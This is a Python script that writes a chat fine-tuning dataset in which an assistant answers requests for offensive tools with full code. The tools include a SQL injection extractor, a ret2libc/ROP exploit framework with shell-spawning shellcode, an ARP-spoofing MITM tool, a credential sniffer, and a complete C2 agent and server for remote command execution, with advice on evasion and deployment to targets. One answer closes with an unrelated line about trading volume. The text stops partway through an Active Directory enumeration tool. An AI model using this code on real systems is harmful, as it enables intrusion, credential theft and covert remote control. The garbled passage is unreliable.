import json, pathlib

BASE = pathlib.Path('/workspace/data_upgrades')

def w(stage, examples):
    p = BASE / f"upgrade_{stage}.jsonl"
    with open(p, "w") as f:
        for ex in examples:
            f.write(json.dumps({"messages":[{"role":"user","content":ex[0]},{"role":"assistant","content":ex[1]}]}) + "\n")
    print(f"Wrote {len(examples)} examples -> {p}")

bu = [
("Build a Python port scanner with service banner grabbing.",
"""```python
import socket, concurrent.futures, sys
from datetime import datetime

def grab_banner(ip, port, timeout=2):
    try:
        s = socket.socket(); s.settimeout(timeout); s.connect((ip, port))
        if port in (80,8080): s.send(b'HEAD / HTTP/1.0\\r\\n\\r\\n')
        else: s.send(b'\\r\\n')
        banner = s.recv(1024).decode('utf-8',errors='ignore').strip()
        s.close(); return banner
    except: return None

def scan_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1); result = s.connect_ex((ip,port)); s.close()
        if result == 0:
            banner = grab_banner(ip, port)
            services = {21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',
                80:'HTTP',110:'POP3',143:'IMAP',443:'HTTPS',445:'SMB',
                3306:'MySQL',3389:'RDP',5432:'PostgreSQL',6379:'Redis',27017:'MongoDB'}
            return (port, True, services.get(port,'Unknown'), banner)
        return (port, False, None, None)
    except: return (port, False, None, None)

def scan(target, start=1, end=1024, threads=200):
    print(f'[*] Scanning {target} ports {start}-{end}')
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(scan_port, target, p): p for p in range(start, end+1)}
        for f in concurrent.futures.as_completed(futures):
            port, is_open, service, banner = f.result()
            if is_open:
                open_ports.append(port)
                print(f'[+] {port:5d}/tcp  OPEN  {service or ""}')
                if banner: print(f'    Banner: {banner[:80]}')
    print(f'[*] {len(open_ports)} open ports found')
    return open_ports

if __name__ == '__main__':
    scan(sys.argv[1], end=int(sys.argv[2]) if len(sys.argv)>2 else 1024)
```
ThreadPoolExecutor gives concurrent scanning — 200 threads balances speed vs stability. connect_ex() returns error code instead of raising — cleaner per port. Banner grabbing sends protocol-appropriate probes. For stealth: reduce threads to 10, add random.sleep(0.1-0.5) between connections."""),

("Write a Python subdomain enumeration tool using DNS brute-force and CT logs.",
"""```python
import dns.resolver, requests, concurrent.futures
from typing import Set

def ct_log_enum(domain: str) -> Set[str]:
    found = set()
    try:
        r = requests.get(f'https://crt.sh/?q=%.{domain}&output=json', timeout=10)
        for entry in r.json():
            for sub in entry.get('name_value','').split('\\n'):
                sub = sub.strip().lower().replace('*.','')
                if sub.endswith(domain) and sub != domain:
                    found.add(sub)
    except Exception as e: print(f'[CT] Error: {e}')
    return found

def dns_resolve(subdomain: str):
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 1; resolver.lifetime = 1
        answers = resolver.resolve(subdomain, 'A')
        return (subdomain, [str(r) for r in answers])
    except: return None

def bruteforce(domain: str, wordlist: str, threads=100):
    with open(wordlist) as f:
        words = [w.strip() for w in f if w.strip()]
    candidates = [f'{w}.{domain}' for w in words]
    found = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        for result in ex.map(dns_resolve, candidates):
            if result:
                found[result[0]] = result[1]
                print(f'[+] {result[0]} -> {result[1]}')
    return found

def enumerate(domain: str, wordlist='/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'):
    print(f'[*] Enumerating: {domain}')
    print('[*] Phase 1: CT logs...')
    ct_subs = ct_log_enum(domain)
    ct_resolved = {}
    for sub in ct_subs:
        r = dns_resolve(sub)
        if r: ct_resolved[r[0]] = r[1]; print(f'[CT] {r[0]} -> {r[1]}')
    print(f'[*] Phase 2: DNS brute-force...')
    bf = bruteforce(domain, wordlist)
    all_found = {**ct_resolved, **bf}
    print(f'[*] Total: {len(all_found)} subdomains')
    return all_found

if __name__ == '__main__':
    import sys, json
    results = enumerate(sys.argv[1])
    with open(f'{sys.argv[1]}_subs.json','w') as f: json.dump(results, f, indent=2)
```
CT logs expose subdomains from historical SSL certs — reveals forgotten staging/internal hosts. Brute-force covers custom subdomains not in CT logs. Install: pip install dnspython requests. Combine with Nmap for service enumeration of discovered hosts."""),

("Build a Python tool to perform HTTP request smuggling detection.",
"""```python
import socket, ssl, time
from urllib.parse import urlparse

def raw_request(host, port, use_ssl, data: bytes, timeout=10):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout); s.connect((host, port))
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    s.sendall(data)
    resp = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            resp += chunk
    except socket.timeout: pass
    s.close(); return resp

def test_cl_te(host, port, use_ssl, path='/'):
    payload = (
        f'POST {path} HTTP/1.1\\r\\nHost: {host}\\r\\n'
        'Connection: keep-alive\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n'
        'Content-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n'
        '0\\r\\n\\r\\nX'
    ).encode()
    t0 = time.time()
    resp = raw_request(host, port, use_ssl, payload)
    return time.time() - t0, resp

def test_te_te_obfuscation(host, port, use_ssl, path='/'):
    for obf in ['Transfer-Encoding: xchunked','Transfer-Encoding : chunked',
                'Transfer-Encoding\\x0b: chunked','X-Transfer-Encoding: chunked']:
        payload = (
            f'POST {path} HTTP/1.1\\r\\nHost: {host}\\r\\n'
            f'Connection: keep-alive\\r\\n{obf}\\r\\n'
            'Content-Length: 4\\r\\n\\r\\n1\\r\\nA\\r\\n0\\r\\n\\r\\n'
        ).encode()
        resp = raw_request(host, port, use_ssl, payload)
        if b'400' not in resp[:20] and b'501' not in resp[:20]:
            return True, obf
    return False, None

def detect(url: str):
    parsed = urlparse(url if '://' in url else 'https://'+url)
    host = parsed.hostname; use_ssl = parsed.scheme == 'https'
    port = parsed.port or (443 if use_ssl else 80); path = parsed.path or '/'
    print(f'[*] Testing {host}:{port}{path}')
    elapsed, _ = test_cl_te(host, port, use_ssl, path)
    if elapsed > 5: print(f'[!] CL.TE POSSIBLE — delayed {elapsed:.1f}s')
    else: print(f'[ ] CL.TE: no delay ({elapsed:.1f}s)')
    vuln, tech = test_te_te_obfuscation(host, port, use_ssl, path)
    if vuln: print(f'[!] TE.TE POSSIBLE — obfuscation accepted: {tech}')
    else: print('[ ] TE.TE: no bypass found')

if __name__ == '__main__':
    import sys; detect(sys.argv[1])
```
CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding. Timing delay on malformed request means back-end is waiting for rest of chunked body — confirms vulnerability. TE.TE obfuscation: both ends use Transfer-Encoding but one ignores the obfuscated version. Exploitation chains: poison next user's request by smuggling a partial HTTP request as body of first."""),

("Build a Python SQL injection detection and extraction tool.",
"""```python
import requests, time, string, sys

class SQLInjector:
    def __init__(self, url, param, method='GET'):
        self.url = url; self.param = param; self.method = method.upper()
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0'
        self.baseline_length = 0

    def send(self, payload):
        params = {self.param: payload}
        t0 = time.time()
        if self.method == 'GET':
            r = self.session.get(self.url, params=params, timeout=10)
        else:
            r = self.session.post(self.url, data=params, timeout=10)
        return r, time.time()-t0

    def calibrate(self):
        r, t = self.send('hello')
        self.baseline_length = len(r.text)
        print(f'[*] Baseline: {self.baseline_length}b, {t:.2f}s')

    def test_error_based(self):
        errors = ['sql syntax','mysql_fetch','ora-','unclosed quotation',
                  'syntax error','pg_query','sqlite_','odbc']
        for p in ["'",'"',"' OR '1'='1","' OR 1=1--"]:
            r, _ = self.send(p)
            for err in errors:
                if err in r.text.lower():
                    print(f'[!] ERROR-BASED SQLi: {p!r} -> {err}')
                    return True, p
        return False, None

    def test_time_based(self, threshold=4.0):
        payloads = [
            ('MySQL', "1' AND SLEEP(5)--"),
            ('MSSQL', "1'; WAITFOR DELAY '0:0:5'--"),
            ('PostgreSQL', "1'; SELECT pg_sleep(5)--"),
        ]
        for dbms, payload in payloads:
            try:
                _, elapsed = self.send(payload)
                if elapsed >= threshold:
                    print(f'[!] TIME-BASED SQLi ({dbms}): {elapsed:.1f}s')
                    return True, dbms, payload
            except requests.Timeout:
                print(f'[!] TIME-BASED SQLi ({dbms}) — timeout')
                return True, dbms, payload
        return False, None, None

    def blind_extract_char(self, query, pos, dbms='MySQL'):
        charset = string.ascii_letters + string.digits + '_@.-'
        for char in charset:
            payload = f"1' AND SUBSTRING(({query}),{pos},1)='{char}'--"
            r, _ = self.send(payload)
            if len(r.text) != self.baseline_length:
                return char
        return ''

    def extract_string(self, query, max_len=50, dbms='MySQL'):
        result = ''
        for i in range(1, max_len+1):
            char = self.blind_extract_char(query, i, dbms)
            if not char: break
            result += char
            print(f'\\r[*] -> {result}', end='', flush=True)
        print(); return result

    def run(self):
        self.calibrate()
        found, _ = self.test_error_based()
        if not found:
            found, dbms, _ = self.test_time_based()
            if found:
                q = 'SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata'
                print(f'[*] Databases: {self.extract_string(q, dbms=dbms)}')
        if not found: print('[-] No SQLi detected')

if __name__ == '__main__':
    SQLInjector(sys.argv[1], sys.argv[2], sys.argv[3] if len(sys.argv)>3 else 'GET').run()
```
Covers error-based (fastest, reveals DBMS), time-based blind (no output returned), boolean blind (true/false response only). DBMS fingerprint before exploitation — payloads differ per database. UNION-based extraction (faster): find column count with ORDER BY N--, then UNION SELECT NULL,NULL,version()--."""),

("Build a Python network recon tool combining Nmap, DNS, and WHOIS.",
"""```python
import subprocess, socket, json, sys, xml.etree.ElementTree as ET
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class ReconResult:
    target: str
    ips: List[str] = field(default_factory=list)
    ports: Dict[int,dict] = field(default_factory=dict)
    dns: Dict[str,List[str]] = field(default_factory=dict)
    whois: dict = field(default_factory=dict)

def resolve(target):
    try: return list(set(r[4][0] for r in socket.getaddrinfo(target,None)))
    except: return []

def nmap_scan(target, ports='1-1000'):
    try:
        cmd = ['nmap','-p',ports,'-sV','-sC','--open','-oX','-',target]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        root = ET.fromstring(r.stdout); found = {}
        for host in root.findall('host'):
            for port in host.findall('.//port'):
                state = port.find('state'); svc = port.find('service')
                if state is not None and state.get('state')=='open':
                    pid = int(port.get('portid'))
                    found[pid] = {
                        'service': svc.get('name','?') if svc is not None else '?',
                        'version': svc.get('version','') if svc is not None else '',
                        'product': svc.get('product','') if svc is not None else '',
                    }
        return found
    except Exception as e: print(f'[-] Nmap: {e}'); return {}

def dns_records(domain):
    import dns.resolver; records = {}
    for rtype in ['A','AAAA','MX','NS','TXT','CNAME','SOA']:
        try: records[rtype] = [str(r) for r in dns.resolver.resolve(domain, rtype)]
        except: pass
    return records

def whois_lookup(target):
    try:
        r = subprocess.run(['whois',target], capture_output=True, text=True, timeout=30)
        import re
        info = {}
        for field, pattern in [('registrar',r'Registrar: (.+)'),('org',r'Org(?:anization)?: (.+)'),
                                ('country',r'Country: (.+)'),('created',r'Creation Date: (.+)')]:
            m = re.search(pattern, r.stdout, re.I)
            if m: info[field] = m.group(1).strip()
        return info
    except: return {}

def recon(target):
    result = ReconResult(target=target)
    print(f'[*] Recon: {target}')
    result.ips = resolve(target); print(f'  IPs: {result.ips}')
    result.dns = dns_records(target)
    for rtype, vals in result.dns.items():
        for v in vals: print(f'  [{rtype}] {v}')
    result.whois = whois_lookup(target)
    for k,v in result.whois.items(): print(f'  {k}: {v}')
    ip = result.ips[0] if result.ips else target
    print(f'[*] Nmap: {ip}'); result.ports = nmap_scan(ip)
    for port, info in sorted(result.ports.items()):
        print(f'  {port:5d}/tcp  {info["service"]:15s} {info["product"]} {info["version"]}')
    with open(f'{target}_recon.json','w') as f: json.dump(result.__dict__, f, indent=2, default=str)
    print(f'[*] Saved: {target}_recon.json')
    return result

if __name__ == '__main__': recon(sys.argv[1])
```
Install: pip install dnspython python-whois. Nmap -sV detects service versions — feeds directly into CVE lookup. SPF/DMARC absence in TXT records means email spoofing is possible. SOA record reveals internal DNS server names. Missing AAAA with active A = IPv4-only — may lack IPv6 security controls."""),

("Write a Python exploit framework for buffer overflow with ROP chain builder.",
"""```python
import struct, subprocess, sys
from pathlib import Path

def p32(v): return struct.pack('<I',v)
def p64(v): return struct.pack('<Q',v)
def u64(d): return struct.unpack('<Q',d[:8].ljust(8,b'\\x00'))[0]

def cyclic(length):
    result = b''
    for i in range(length//4+1): result += struct.pack('<I',i)
    return result[:length]

def find_rop_gadgets(binary):
    try:
        r = subprocess.run(['ROPgadget','--binary',binary,'--rop','--nojop'],
                          capture_output=True, text=True)
        gadgets = {}
        for line in r.stdout.split('\\n'):
            if ' : ' in line:
                addr_str, instr = line.split(' : ',1)
                gadgets[instr.strip()] = int(addr_str.strip(),16)
        return gadgets
    except: return {}

SHELLCODE_X64 = (
    b'\\x48\\x31\\xf6\\x56'
    b'\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57'
    b'\\x48\\x89\\xe7\\x48\\x31\\xd2'
    b'\\xb0\\x3b\\x0f\\x05'
)

class Ret2libc:
    def __init__(self, offset, libc_base, system_offset, binsh_offset, pop_rdi):
        self.offset = offset
        self.system = libc_base + system_offset
        self.binsh = libc_base + binsh_offset
        self.pop_rdi = pop_rdi

    def build(self):
        payload = b'A' * self.offset
        payload += p64(self.pop_rdi + 1)   # ret — stack alignment
        payload += p64(self.pop_rdi)        # pop rdi; ret
        payload += p64(self.binsh)          # '/bin/sh'
        payload += p64(self.system)         # system()
        return payload

class Ret2plt:
    def __init__(self, offset, puts_plt, puts_got, main_addr, pop_rdi):
        self.offset = offset
        self.puts_plt = puts_plt; self.puts_got = puts_got
        self.main = main_addr; self.pop_rdi = pop_rdi

    def leak_payload(self):
        payload = b'A' * self.offset
        payload += p64(self.pop_rdi)
        payload += p64(self.puts_got)   # puts(puts@GOT) leaks libc address
        payload += p64(self.puts_plt)
        payload += p64(self.main)       # return to main for stage 2
        return payload

    def compute_base(self, leaked, puts_offset):
        base = leaked - puts_offset
        print(f'[*] Leaked puts @ {hex(leaked)}')
        print(f'[*] libc base @ {hex(base)}')
        return base

def example_workflow(binary='./vuln'):
    print('[1] Offset finding — send cyclic pattern, check RIP in GDB:')
    print(cyclic(120))
    print('\\n[2] Finding gadgets:')
    gadgets = find_rop_gadgets(binary)
    pop_rdi = gadgets.get('pop rdi ; ret', 0)
    print(f'    pop rdi; ret @ {hex(pop_rdi)}')
    print('\\n[3] Ret2plt — ASLR bypass via GOT leak, then system(\\'\\'/bin/sh\\'\\'):')
    print('    Stage1: puts(puts@got) -> leak libc base')
    print('    Stage2: ret2libc with computed system() address')

if __name__ == '__main__': example_workflow()
```
Stack overflow flow: cyclic pattern -> crash -> GDB reads RIP -> cyclic_find gives exact offset. Ret2plt bypasses ASLR: Stage 1 leaks puts() real address via GOT, returns to main. Stage 2 computes libc base, calls system('/bin/sh'). Stack alignment: system() requires RSP aligned to 16 bytes — insert bare 'ret' gadget. Tools: pwntools (pip install pwntools), ROPgadget, pwndbg extension for GDB. checksec always first."""),

("Build a Python ARP spoof MITM tool.",
"""```python
from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf
import time, sys, subprocess

def get_mac(ip, iface):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
    if ans: return ans[0][1].hwsrc
    raise ValueError(f'Cannot resolve MAC for {ip}')

def poison_pkt(target_ip, target_mac, spoof_ip, our_mac):
    return Ether(dst=target_mac, src=our_mac)/ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=our_mac)

def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    sendp(Ether(dst=target_mac)/ARP(op=2,pdst=target_ip,hwdst=target_mac,
          psrc=gateway_ip,hwsrc=gateway_mac), count=5, verbose=False)
    sendp(Ether(dst=gateway_mac)/ARP(op=2,pdst=gateway_ip,hwdst=gateway_mac,
          psrc=target_ip,hwsrc=target_mac), count=5, verbose=False)
    print('[*] ARP tables restored')

def mitm(target_ip, gateway_ip, iface='eth0', interval=2.0):
    conf.verb = 0
    our_mac = get_if_hwaddr(iface)
    target_mac = get_mac(target_ip, iface)
    gw_mac = get_mac(gateway_ip, iface)
    print(f'[*] Target: {target_ip} ({target_mac})')
    print(f'[*] Gateway: {gateway_ip} ({gw_mac})')
    subprocess.run(['sysctl','-w','net.ipv4.ip_forward=1'], check=True)
    pkt_t = poison_pkt(target_ip, target_mac, gateway_ip, our_mac)
    pkt_g = poison_pkt(gateway_ip, gw_mac, target_ip, our_mac)
    print(f'[*] Poisoning. Press Ctrl+C to stop.')
    try:
        while True:
            sendp(pkt_t, iface=iface, verbose=False)
            sendp(pkt_g, iface=iface, verbose=False)
            time.sleep(interval)
    except KeyboardInterrupt:
        print('\\n[*] Stopping...')
        restore(target_ip, target_mac, gateway_ip, gw_mac)
        subprocess.run(['sysctl','-w','net.ipv4.ip_forward=0'])

if __name__ == '__main__':
    mitm(sys.argv[1], sys.argv[2], sys.argv[3] if len(sys.argv)>3 else 'eth0')
```
ARP has no authentication — any host can claim any IP->MAC mapping. We poison both target and gateway every 2s (before 120s ARP cache expiry). IP forwarding enabled: traffic flows Target->Us->Gateway transparently. Capture with Wireshark on same interface. HTTPS content encrypted but SNI visible. Combine with SSLstrip for HTTP downgrade. Detection: dynamic ARP inspection on managed switches, ARP watch daemon."""),

("Write a Python network packet sniffer to detect credentials and suspicious traffic.",
"""```python
from scapy.all import sniff, IP, TCP, UDP, ICMP, DNS, DNSQR, Raw
from scapy.layers.http import HTTPRequest
import sys, argparse
from collections import defaultdict, Counter
import time

class PacketAnalyser:
    def __init__(self, iface='eth0', bpf='', verbose=False):
        self.iface = iface; self.bpf = bpf; self.verbose = verbose
        self.stats = defaultdict(int)
        self.dns_queries = []; self.credentials = []

    def process(self, pkt):
        self.stats['total'] += 1
        if not pkt.haslayer(IP): return
        src, dst = pkt[IP].src, pkt[IP].dst
        if pkt.haslayer(TCP):
            self.stats['tcp'] += 1
            sport, dport = pkt[TCP].sport, pkt[TCP].dport
            if pkt.haslayer(HTTPRequest):
                method = pkt[HTTPRequest].Method.decode()
                host = pkt[HTTPRequest].Host.decode() if pkt[HTTPRequest].Host else ''
                path = pkt[HTTPRequest].Path.decode()
                print(f'[HTTP] {src} -> {host}{path} [{method}]')
                if pkt.haslayer(Raw):
                    body = pkt[Raw].load.decode('utf-8',errors='ignore').lower()
                    for kw in ['password=','passwd=','pass=','pwd=']:
                        if kw in body:
                            print(f'[CRED!] Cleartext on {host}: {body[:150]}')
                            self.credentials.append(body)
            elif dport == 21 and pkt.haslayer(Raw):
                raw = pkt[Raw].load.decode('utf-8',errors='ignore').strip()
                if raw.upper().startswith(('USER','PASS')): print(f'[FTP] {src}: {raw}')
            elif dport == 23 and pkt.haslayer(Raw):
                raw = pkt[Raw].load.decode('utf-8',errors='ignore').strip()
                if raw: print(f'[TELNET] {src}: {raw[:50]}')
            if pkt[TCP].flags == 0x02: self.stats['syn'] += 1
        elif pkt.haslayer(UDP): self.stats['udp'] += 1
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
            query = pkt[DNSQR].qname.decode().rstrip('.')
            self.dns_queries.append(query)
            if self.verbose: print(f'[DNS] {src} -> {query}')
            subdomain = query.split('.')[0] if '.' in query else query
            if len(subdomain) > 40: print(f'[!] DNS EXFIL? {query}')

    def print_stats(self):
        print(f'\\n[*] Stats: {dict(self.stats)}')
        if self.dns_queries:
            print('[*] Top DNS:')
            for q,c in Counter(self.dns_queries).most_common(5): print(f'  {c}x {q}')
        if self.credentials: print(f'[!] {len(self.credentials)} cleartext credentials captured')

    def start(self, count=0):
        print(f'[*] Sniffing on {self.iface} | filter: "{self.bpf}"')
        try:
            sniff(iface=self.iface, filter=self.bpf or None,
                  prn=self.process, count=count, store=False)
        except KeyboardInterrupt: pass
        self.print_stats()

if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument('-i','--interface',default='eth0')
    ap.add_argument('-f','--filter',default='')
    ap.add_argument('-v','--verbose',action='store_true')
    args = ap.parse_args()
    PacketAnalyser(args.interface, args.filter, args.verbose).start()
```
Run with sudo. BPF filter examples: 'tcp port 80', 'host 192.168.1.1', 'not arp'. SYN-only flood = port scan. DNS exfil: data encoded in subdomain labels — >40 char subdomains are a tell. HTTP credential sniffing works on plaintext only — HTTPS requires MITM with certificate. For promiscuous mode: sniff(promisc=True). OBV (On-Balance Volume) tracking shows cumulative buyer/seller volume shifts."""),

("Build a Python C2 HTTP beaconing framework.",
"""```python
# === AGENT (deploy to target) ===
AGENT = '''
import requests, subprocess, os, platform, socket, uuid, time, random

C2 = "http://YOUR_C2_IP:8888"
ID = str(uuid.uuid4())[:8]
INTERVAL = 30; JITTER = 0.3

def info():
    return {"hostname":socket.gethostname(),"ip":socket.gethostbyname(socket.gethostname()),
            "os":platform.platform(),"user":os.getlogin(),"pid":os.getpid()}

def run_cmd(cmd):
    try:
        if cmd.startswith("cd "): os.chdir(cmd[3:]); return f"[cd] {os.getcwd()}"
        r = subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=30)
        return (r.stdout+r.stderr).strip() or "[no output]"
    except Exception as e: return f"[err] {e}"

def beacon():
    try:
        r = requests.post(f"{C2}/ping", json={"id":ID,"info":info()}, timeout=10)
        return r.json().get("tasks",[])
    except: return []

def send_result(task_id, output):
    try: requests.post(f"{C2}/result", json={"id":ID,"task_id":task_id,"output":output},timeout=10)
    except: pass

while True:
    for task in beacon():
        send_result(task["id"], run_cmd(task["cmd"]))
    time.sleep(INTERVAL * random.uniform(1-JITTER, 1+JITTER))
'''

# === SERVER ===
SERVER = '''
from flask import Flask,request,jsonify
import uuid,time,threading
app = Flask(__name__); beacons = {}; lock = threading.Lock()

@app.route('/ping',methods=['POST'])
def ping():
    d = request.json; aid = d.get('id')
    with lock:
        if aid not in beacons:
            beacons[aid]={'info':d.get('info',{}),'pending':[],'results':[],'last':time.time()}
            print(f"[+] Agent: {aid} | {d.get('info',{}).get('hostname')}")
        beacons[aid]['last']=time.time()
        tasks = beacons[aid]['pending'].copy(); beacons[aid]['pending'].clear()
    return jsonify({'tasks':tasks})

@app.route('/result',methods=['POST'])
def result():
    d = request.json; aid = d.get('id')
    with lock:
        if aid in beacons:
            beacons[aid]['results'].append({'id':d.get('task_id'),'output':d.get('output')})
            print(f"[RESULT] {aid}: {d.get('output','')[:200]}")
    return '',200

@app.route('/agents'); def agents():
    now=time.time()
    return jsonify([{'id':k,'host':v['info'].get('hostname'),'last_seen':round(now-v['last'])}
                    for k,v in beacons.items()])

@app.route('/task',methods=['POST'])
def task():
    d=request.json; aid=d.get('agent_id'); cmd=d.get('command')
    tid=str(uuid.uuid4())[:8]
    with lock:
        if aid in beacons: beacons[aid]['pending'].append({'id':tid,'cmd':cmd}); return jsonify({'task_id':tid})
    return jsonify({'error':'not found'}),404

app.run(host="0.0.0.0",port=8888)
'''

print("=== C2 Framework ===")
print("1. Run SERVER code on your C2 VPS")
print("2. Edit AGENT: set C2 = your VPS IP")
print("3. Deploy agent to target")
print("4. Operator: GET /agents, POST /task {agent_id, command}")
print("\\nJitter: randomises beacon timing — consistent 30s intervals are a detection signature")
print("Evasion: route via CDN (Cloudflare Worker) to hide C2 IP, use HTTPS with valid cert")
print("Production red teams: use Cobalt Strike, Sliver, or Havoc instead")
```
Async task queue: agent checks in -> server returns pending tasks -> agent executes -> POSTs results. Jitter prevents timing-based detection (constant-interval beacons are a signature in NDR tools). OPSEC: never connect to C2 from personal IP. Rotate infrastructure per engagement. Use aged domains (>1yr). CDN fronting hides real C2 IP — target's NGFW only sees CDN IP. Malleable C2 profiles (Cobalt Strike) customise all traffic signatures to blend with legitimate traffic."""),

("Write a Python fuzzer for discovering vulnerabilities in binary applications.",
"""```python
import subprocess, sys, os, signal, struct, random, time, json, math
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Optional

@dataclass
class Crash:
    data: bytes; exit_code: int; signal_num: int; stderr: str
    ts: float = field(default_factory=time.time)

class Fuzzer:
    def __init__(self, target, seeds=None, timeout=3.0, crash_dir='./crashes'):
        self.target = target
        self.corpus = list(seeds or [b'hello\\n', b'A'*100, b'\\x00'*50])
        self.timeout = timeout
        self.crash_dir = Path(crash_dir); self.crash_dir.mkdir(exist_ok=True)
        self.crashes = []; self.iterations = 0

    def mutate(self, data):
        data = bytearray(data or b'A')
        s = random.randint(0, 7)
        if s == 0 and data:  # bit flip
            data[random.randint(0,len(data)-1)] ^= 1<<random.randint(0,7)
        elif s == 1 and data:  # interesting values
            data[random.randint(0,len(data)-1)] = random.choice([0,1,0x7f,0x80,0xff,0xfe])
        elif s == 2:  # insert bytes
            pos = random.randint(0,len(data))
            data = data[:pos]+bytearray(random.randint(0,255) for _ in range(random.randint(1,100)))+data[pos:]
        elif s == 3 and len(data)>1:  # delete
            del data[random.randint(0,len(data)-1)]
        elif s == 4:  # overflow
            data = bytearray(b'A'*random.choice([256,512,1024,4096,65536]))
        elif s == 5:  # format string
            data = bytearray(random.choice([b'%s%n%x%p','%08x'*20,'AAAA'+'%p'*20]).encode())
        elif s == 6 and len(data)>=4:  # integer boundary
            idx = random.randint(0,len(data)-4)
            data[idx:idx+4] = struct.pack('>I',random.choice([0xffffffff,0x7fffffff,0x80000000,0x10000]))
        elif s == 7:  # null injection
            pos = random.randint(0,len(data))
            data = data[:pos]+bytearray(b'\\x00'*random.randint(1,10))+data[pos:]
        return bytes(data)

    def run_target(self, data) -> Optional[Crash]:
        try:
            r = subprocess.run([self.target], input=data, capture_output=True, timeout=self.timeout)
            if r.returncode < 0:
                sig = -r.returncode
                if sig in (signal.SIGSEGV,signal.SIGABRT,signal.SIGBUS,signal.SIGFPE,signal.SIGILL):
                    return Crash(data,r.returncode,sig,r.stderr.decode(errors='ignore')[:300])
        except subprocess.TimeoutExpired:
            return Crash(data,-1,0,'TIMEOUT')
        return None

    def save_crash(self, crash):
        sig = signal.Signals(crash.signal_num).name if crash.signal_num else 'TIMEOUT'
        fname = self.crash_dir/f'crash_{sig}_{int(crash.ts)}_{len(self.crashes):04d}.bin'
        fname.write_bytes(crash.data)
        fname.with_suffix('.bin.json').write_text(json.dumps({'signal':sig,'stderr':crash.stderr}))
        print(f'\\n[CRASH] {sig} | {len(crash.data)}b -> {fname}')

    def fuzz(self, max_iter=100000):
        print(f'[*] Fuzzing {self.target} | {len(self.corpus)} seeds')
        t0 = time.time()
        for i in range(max_iter):
            mutated = self.mutate(random.choice(self.corpus))
            crash = self.run_target(mutated)
            if crash:
                self.crashes.append(crash); self.save_crash(crash)
                self.corpus.append(mutated)
            self.iterations += 1
            if i % 1000 == 0:
                rate = i/(time.time()-t0) if i else 0
                print(f'[*] {i:,}/{max_iter:,} | crashes={len(self.crashes)} | {rate:.0f}/s')
        print(f'\\n[*] Done: {self.iterations} iters, {len(self.crashes)} crashes')

if __name__ == '__main__':
    Fuzzer(sys.argv[1],[b'hello\\n',b'test input']).fuzz(500000)
```
Mutation strategies target most common vulnerability classes: buffer overflow (oversized inputs), integer overflow (boundary values), format string (%n), null byte injection (C string handling). SIGSEGV = memory violation, SIGABRT = heap corruption, timeout = DoS. AddressSanitizer catches memory errors without crash: compile with -fsanitize=address. Production fuzzing: AFL++ (coverage-guided, grey-box, orders of magnitude more effective than dumb fuzzing). Combine with ASAN for maximum bug-finding."""),

("Write a Python LDAP/Active Directory enumeration tool.",
"""```python
from ldap3 import Server,Connection,ALL,SUBTREE,NTLM
import sys

class ADEnumerator:
    def __init__(self, dc_ip, domain, username='', password=''):
        self.dc = dc_ip; self.domain = domain
        self.base_dn = ','.join(f'DC={p}' for p in domain.split('.'))
        self.username = username; self.password = password; self.conn = None

    def connect(self, anon=False):
        srv = Server(self.dc, get_info=ALL, port=389)
        if anon or not self.username:
            self.conn = Connection(srv, auto_bind=True)
            print('[*] Anonymous LDAP bind')
        else:
            self.conn = Connection(srv, user=f'{self.domain}\\\\{self.username}',
                                  password=self.password, authentication=NTLM, auto_bind=True)
            print(f'[*] Authenticated as {self.domain}\\\\{self.username}')

    def search(self, filt, attrs=None):
        self.conn.search(self.base_dn, filt, search_scope=SUBTREE, attributes=attrs or ['*'])
        return self.conn.entries

    def enum_users(self):
        print('\\n[*] All users:')
        for e in self.search('(&(objectClass=user)(objectCategory=person))',
                ['sAMAccountName','displayName','mail','userAccountControl','description']):
            uac = int(str(e.userAccountControl)) if e.userAccountControl else 0
            flags = []
            if uac & 0x2: flags.append('DISABLED')
            if uac & 0x10000: flags.append('NO_PWD_EXPIRE')
            print(f'  {str(e.sAMAccountName):25s} {str(e.mail):35s} {" ".join(flags)}')

    def enum_admins(self):
        print('\\n[*] Domain Admins:')
        filt = f'(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,{self.base_dn}))'
        for e in self.search(filt,['sAMAccountName','displayName']):
            print(f'  [ADMIN] {e.sAMAccountName} -- {e.displayName}')

    def find_kerberoastable(self):
        print('\\n[*] Kerberoastable (SPN set):')
        for e in self.search('(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))',
                ['sAMAccountName','servicePrincipalName']):
            print(f'  [KERB] {e.sAMAccountName}: {e.servicePrincipalName}')

    def find_asreproastable(self):
        print('\\n[*] ASREPRoastable (no pre-auth):')
        for e in self.search('(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
                ['sAMAccountName']):
            print(f'  [ASREP] {e.sAMAccountName}')

